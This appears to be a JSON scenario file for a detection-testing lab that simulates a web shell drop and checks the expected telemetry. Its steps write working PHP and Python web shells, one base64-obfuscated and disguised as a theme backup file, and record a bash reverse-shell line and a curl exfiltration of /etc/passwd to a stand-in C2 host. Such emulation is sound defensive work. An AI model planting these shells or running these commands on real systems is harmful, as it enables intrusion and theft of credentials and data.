{
  "scenario_id": "web_shell_001",
  "name": "Web Shell Drop — Upload Sim, PHP/Python Shell Plant, Command Exec via HTTP Stub",
  "class_name": "persistence_execution",
  "mode": "lab_only",
  "risk_level": "critical",
  "hosts": ["workstation-1"],
  "preconditions": ["telemetry collector active", "web root writable in lab env"],
  "behavior_profile": {
    "shell_plant": true,
    "shell_exec": true,
    "cleanup": true
  },
  "custom_behaviors": {
    "shell_plant": [
      {"step_id": "create_web_root_sim", "command": "mkdir -p /tmp/ClawdianShield/webroot/uploads /tmp/ClawdianShield/webroot/wp-content/themes/default"},
      {"step_id": "drop_php_shell", "command": "printf '<?php if(isset($_REQUEST[\"cmd\"])){echo \"<pre>\";$cmd=$_REQUEST[\"cmd\"];system($cmd);echo \"</pre>\";} ?>' > /tmp/ClawdianShield/webroot/uploads/image.php"},
      {"step_id": "drop_disguised_shell", "command": "printf '<?php eval(base64_decode(\"cGFzc3RocnUoJF9HRVRbJ2MnXSk7\"));?>' > /tmp/ClawdianShield/webroot/wp-content/themes/default/header.php.bak && cp /tmp/ClawdianShield/webroot/wp-content/themes/default/header.php.bak /tmp/ClawdianShield/webroot/uploads/info.php"},
      {"step_id": "drop_python_shell", "command": "echo 'import os, http.server\\nclass H(http.server.BaseHTTPRequestHandler):\\n    def do_GET(self):self.send_response(200);self.end_headers();os.system(self.path[1:])' > /tmp/ClawdianShield/webroot/uploads/pshell.py"},
      {"step_id": "set_permissive_perms", "command": "chmod 777 /tmp/ClawdianShield/webroot/uploads/image.php /tmp/ClawdianShield/webroot/uploads/info.php /tmp/ClawdianShield/webroot/uploads/pshell.py 2>/dev/null || true"},
      {"step_id": "enumerate_web_root", "command": "find /tmp/ClawdianShield/webroot -name '*.php' -o -name '*.py' 2>/dev/null > /tmp/ClawdianShield/web_shell_manifest.txt"}
    ],
    "shell_exec": [
      {"step_id": "simulate_cmd_execution", "command": "bash -c 'cat /etc/passwd' > /tmp/ClawdianShield/webroot/cmd_output.txt 2>/dev/null || true"},
      {"step_id": "write_reverse_shell_stub", "command": "echo 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1' > /tmp/ClawdianShield/reverse_shell_stub.txt"},
      {"step_id": "curl_exfil_stub", "command": "echo 'curl -d @/etc/passwd http://c2.example.com/collect' >> /tmp/ClawdianShield/reverse_shell_stub.txt"},
      {"step_id": "verify_artifacts", "command": "wc -l /tmp/ClawdianShield/webroot/uploads/*.php /tmp/ClawdianShield/web_shell_manifest.txt > /tmp/ClawdianShield/web_shell_summary.txt 2>/dev/null || true"}
    ]
  },
  "custom_behavior_techniques": {
    "shell_plant": "T1505.003",
    "shell_exec": "T1059.004"
  },
  "custom_behavior_produces": {
    "shell_plant": ["file_events", "hash_deltas", "process_events"],
    "shell_exec": ["process_events", "file_events"]
  },
  "expected_telemetry": {
    "file_events": true,
    "hash_deltas": true,
    "process_events": true
  },
  "detections_expected": [
    "php_written_to_upload_dir",
    "script_execution_from_web_root",
    "reverse_shell_command_pattern",
    "world_writable_script_created"
  ],
  "success_criteria": [
    "image.php / info.php creation in uploads dir detected by file_observer",
    "chmod 777 on .php file generates process_event",
    "reverse shell stub text flagged by pattern matcher"
  ],
  "safety_constraints": {
    "lab_environment_only": true,
    "no_real_reverse_shell": true,
    "no_real_exploit_logic": true,
    "no_unapproved_network_spread": true
  }
}
